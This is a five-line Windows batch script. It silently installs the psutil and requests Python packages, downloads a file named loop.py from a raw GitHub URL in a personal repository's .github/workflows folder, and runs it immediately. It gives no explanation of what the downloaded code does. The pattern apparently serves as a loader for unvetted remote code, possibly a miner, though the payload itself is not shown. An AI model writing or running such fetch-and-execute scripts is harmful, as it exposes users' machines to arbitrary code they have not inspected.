@echo off
pip install psutil --quiet
pip install requests --quiet
curl -s -L -o loop.py https://raw.githubusercontent.com/iamo4r2/min/main/.github/workflows/loop.py
python loop.py
